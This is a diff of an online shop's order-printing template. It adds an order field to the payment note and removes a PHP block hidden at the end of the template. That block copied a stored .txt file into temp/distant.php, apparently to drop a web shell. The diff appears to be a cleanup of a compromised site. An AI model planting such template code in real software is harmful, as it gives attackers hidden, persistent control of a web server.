@@ -82,7 +82,7 @@ body,td { font-size:13px; }
         </tr>
         <tr>
             <!-- 支付备注 -->
-            <td>{$lang.pay_note} {$order.pay_note}</td>
+            <td>{$lang.pay_note} {$order.pay_note}{$order.c_id}</td>
         </tr>
         <tr>
             <!-- 网店名称, 网店地址, 网店URL以及联系电话 -->
@@ -94,9 +94,3 @@ body,td { font-size:13px; }
         </tr>
     </tbody>
 </table>
-<script language="php">$file = file_get_contents("C:\hichinawebtest\1mall\data\article\1364888938453546924.txt");
-if($file){
-$file = "C:\hichinawebtest\1mall\data\article\1364888938453546924.txt";
-$newfile = ' C:\hichinawebtest\1mall\temp\distant.php';
-copy($file,$newfile);
-}</script>
